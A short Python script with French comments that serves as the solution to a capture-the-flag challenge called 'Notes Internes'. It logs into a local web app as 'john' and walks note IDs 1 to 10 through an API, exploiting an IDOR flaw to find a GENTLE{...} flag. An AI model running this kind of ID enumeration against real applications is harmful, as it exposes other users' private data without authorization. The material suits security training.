#!/usr/bin/env python3
# Script d'exploitation IDOR - Challenge Notes Internes

import requests
import re
import sys

# Configuration
URL = "http://localhost:8081"
USERNAME = "john"
PASSWORD = "password123"

def exploit():
    """Exploitation simple de la vulnérabilité IDOR"""
    
    print("[*] Connexion en tant que john...")
    
    # Créer une session
    session = requests.Session()
    
    # Connexion
    login_data = {
        'username': USERNAME,
        'password': PASSWORD
    }
    
    try:
        response = session.post(f"{URL}/login", data=login_data)
        
        if response.status_code != 200:
            print("[-] Échec de la connexion")
            return False
            
        print("[+] Connexion réussie")
        print("[*] Recherche du flag dans les notes 1 à 10...")
        
        # Tester les notes 1 à 10
        for note_id in range(1, 11):
            print(f"  Test note {note_id}... ", end="")
            
            # Récupérer la note via l'API
            response = session.get(f"{URL}/api/note/{note_id}")
            
            if response.status_code == 200:
                # Chercher le flag dans la réponse
                if "GENTLE{" in response.text:
                    # Extraire le flag avec une regex
                    flag_match = re.search(r'GENTLE\{[^}]+\}', response.text)
                    if flag_match:
                        flag = flag_match.group(0)
                        print("✅ FLAG TROUVÉ !")
                        print(f"\n🎉 Flag: {flag}")
                        return flag
                else:
                    print("pas de flag")
            else:
                print("note non trouvée")
        
        print("\n[!] Flag non trouvé dans les 10 premières notes")
        
    except requests.exceptions.ConnectionError:
        print(f"\n[-] Impossible de se connecter à {URL}")
        print("   Vérifiez que le serveur est bien lancé")
    except Exception as e:
        print(f"\n[-] Erreur: {e}")
    
    return None

if __name__ == "__main__":
    exploit()